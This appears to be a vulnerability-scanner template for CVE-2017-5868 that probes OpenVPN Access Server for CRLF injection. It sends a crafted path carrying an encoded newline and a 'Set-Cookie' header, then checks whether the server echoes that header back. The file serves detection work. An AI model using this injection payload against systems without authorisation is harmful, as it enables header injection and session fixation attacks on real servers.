id: CVE-2017-5868

info:
  name: CRLF - Injection Detection
  author: rix4uni
  severity: medium
  description: |
    CRLF injection vulnerability in the web interface in OpenVPN Access Server 2.1.4 allows remote attackers to inject arbitrary HTTP headers and consequently conduct session fixation attacks and possibly HTTP response splitting attacks via "%0A" characters in the PATH_INFO to __session_start__/.
  reference:
    - https://hackerone.com/reports/237357
  tags: crlf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/__session_start__/%0aSet-Cookie:crlfinjection=1"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'Set-Cookie: crlfinjection=1'

      - type: status
        status:
          - 200